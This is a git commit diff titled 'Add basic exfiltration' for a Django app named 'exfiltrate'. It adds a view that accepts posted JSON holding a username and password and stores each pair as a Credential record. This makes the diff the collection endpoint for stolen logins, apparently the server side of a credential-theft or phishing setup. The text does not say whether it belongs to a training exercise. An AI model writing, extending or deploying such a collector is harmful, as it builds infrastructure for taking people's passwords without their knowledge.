feba6e216414dec59ceed8999460932c2a81926f
neuronaddict <dev@lacourarie.org>
2020-02-13 23:50:43 +0100

    Add basic exfiltration.

--- exfiltrate/views.py
+++ exfiltrate/views.py
@@ -1,5 +1,18 @@
+import json
+
 from django.http import HttpResponse
+from django.template import loader
+
+from exfiltrate.models import Credential
 
 
 def index(request):
-    return HttpResponse("Hello world!")
+    template = loader.get_template('exfiltrate/index.html')
+    return HttpResponse(template.render({}, request))
+
+
+def exfiltrate(request):
+    cred_json = json.loads(request.body)
+    cred = Credential(username=cred_json['username'], password=cred_json['password'])
+    cred.save()
+    return HttpResponse(status=204)
